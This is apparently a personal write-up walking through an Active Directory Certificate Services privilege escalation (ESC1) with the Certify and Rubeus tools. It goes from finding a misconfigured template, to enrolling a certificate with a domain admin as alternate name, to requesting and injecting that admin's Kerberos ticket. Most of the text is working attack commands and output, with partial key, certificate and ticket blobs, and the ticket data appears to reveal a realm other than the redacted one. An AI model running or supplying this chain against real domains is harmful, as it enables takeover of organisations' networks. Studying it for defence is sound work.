Thanks for great paper and tool : https://github.com/GhostPack/Certify

Simple explaination : 

There is multiple certificate templates in AD CS, some of them we have enrollment rights and some of them we dont. Also there is a flag  for "ENROLLEE_SUPPLIES_SUBJECT" which means when requesting a certificate, we can also define a alternate name for it. We will enroll a certificate and give alternate name as one of domain admin accounts and use this certificate to request a TGT 

First i will compile and run in memory as mentioned : https://github.com/GhostPack/Certify#sidenote-running-certify-through-powershell

Check vulnerable CA

	[Certify.Program]::Main("find /vulnerable".Split())
	
There is a vulnerable template

	CA Name                               : Valhalla-CA1.valhalla.local\valhalla-CA
	Template Name                         : ValhallaUser
	Schema Version                        : 2
	Validity Period                       : 1 year
	Renewal Period                        : 6 weeks
	msPKI-Certificates-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
	mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
	Authorized Signatures Required        : 0
	pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
	mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
	Permissions
	Enrollment Permissions
	Enrollment Rights           : valhalla\Domain Admins        S-1-5-21-******-******-******-512
						valhalla\Domain Users         S-1-5-21-******-******-******-513
						valhalla\Enterprise Admins    S-1-5-21-******-******-******-519
										  						
	Object Control Permissions
			Owner                       : 	valhalla\admin		         S-1-5-21-******-******-******-5747
			WriteOwner Principals       : 	valhalla\Domain Admins        S-1-5-21-******-******-******-512
										  									valhalla\Enterprise Admins    S-1-5-21-******-******-******-519
			WriteDacl Principals        : 	valhalla\Domain Admins        S-1-5-21-******-******-******-512
										 									 valhalla\Enterprise Admins    S-1-5-21-******-******-******-519
			WriteProperty Principals    : 	valhalla\Domain Admins        S-1-5-21-******-******-******-512
										 									 valhalla\Enterprise Admins    S-1-5-21-******-******-******-519
																			 
																			 

Enroll certificate with alternate name which is domain admin

	[Certify.Program]::Main("request /ca:Valhalla-CA1.valhalla.local\valhalla-CA /template:ValhallaUser /altname:superadmin".Split())

	[*] Action: Request a Certificates

	[*] Current user context    : valhalla\testuser
	[*] No subject name specified, using current context as subject.

	[*] Template                : ValhallaUser
	[*] Subject                 : ********
	[*] AltName                 : superadmin

	[*] Certificate Authority   : Valhalla-CA1.valhalla.local\valhalla-CA

	[*] CA Response             : The certificate had been issued.
	[*] Request ID              : 160811

	[*] cert.pem         :

	-----BEGIN RSA PRIVATE KEY-----
	MIIEowIBAAKCAQEAuynAtgBp0JC0nN7oCTl5bCz9/2dPjJx/LWG85DMOYRT5qAlA
	qQ4nNHkIFUwBXPG/BvrB57wTKYkDtoWyTEwJtHY93arS8bH0/PzUyCq4iuTIU/bY
	....................
	Tqau1wKBgB+BIL4QdsS4si1yRztYbXwGYHr2yNUBvgBJzw6sYVryvPV/u3QfCHHN
	+qIbvXmdwIWlc71uFAC7z76IVgzqnCJr4wc9UIPw5P0GYFpkWXPUWzNoMyCCwabD
	GdnlVgCJOVA8x9SaYu4kae/LlKdGAJtWgjI+utWrBQ1wJ4qSpDYZ
	-----END RSA PRIVATE KEY-----
	-----BEGIN CERTIFICATE-----
	MIIGlDCCBXygAwIBAgITOAACdCveKa2lX9NzAAAAAAJ0KzANBgkqhkiG9w0BAQUF
	ADBZMRIwEAYKCZImiZPyLGQBGRYCdHIxEzARBgoJkiaJk/IsZAEZFgNjb20xGDAW
	....................
	lnzIzVhjLAxmfPTJzkpMCWc2tGR4TPxcRM0dDjjq1pXxqx1zOefsfEE/4u5ga4b8
	IkXuWK6XVvv+LfD5wAy4Wu63MPJKD81gLTdCNr4U+4r7yTDmEMIT+3NOCd/o9lhg
	mVlHfB1DYpU=
	-----END CERTIFICATE-----


	[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx



	Certify completed in 00:00:04.6491198
	
Save RSA KEY and Certificate to a file called "cert.pem" and convert it to cert.pfx (i made this in kali linux machine)

	openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
	

Ask TGT with cert.pfx

	.\Rubeus.exe asktgt /user:superadmin /certificate:c:\full\path\of\cert.pfx /domain:valhalla.local /ptt

	[*] Action: Ask TGT

	[*] Using PKINIT with etype rc4_hmac and subject: ********
	[*] Building AS-REQ (w/ PKINIT preauth) for: 'valhalla\superadmin'
	[+] TGT request successful!
	[*] base64(ticket.kirbi):

		  doIFwDCCBbygAwIBBaEDAgEWooIEzjCCBMphggTGMIIEwqADAgEFoREbD09ERUFCQU5LLkNPTS5UUqIk
		  MCKgAwIBAqEbMBkbBmtyYnRndBsPb2RlYWJhbmsuY29tLnRyo4IEgDCCBHygAwIBEqEDAgEFooIEbgSC
		  BGoPpDODKpEjKMJUK+MaYfrYP61rk+Ud/zXcXeFh6snXhXri6UWAFe7jav+eZ5VfvG+KwcH2cFnaX98Y
		  ......................
		  QUJBTksuQ09NLlRSohMwEaADAgEBoQowCBsGYXQuY2FuowcDBQBA4QAApREYDzIwMjExMTE5MDY1NzU0
		  WqYRGA8yMDIxMTExOTE2NTc1NFqnERgPMjAyMTExMjYwNjU3NTRaqBEbD09ERUFCQU5LLkNPTS5UUqkk
		  MCKgAwIBAqEbMBkbBmtyYnRndBsPb2RlYWJhbmsuY29tLnRy

	  ServiceName           :  krbtgt/valhalla.local
	  ServiceRealm          :  valhalla.local
	  UserName              :  superadmin
	  UserRealm             :  valhalla.local
	  StartTime             :  
	  EndTime               :  
	  RenewTill             :  
	  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
	  KeyType               :  rc4_hmac
	  Base64(key)           :  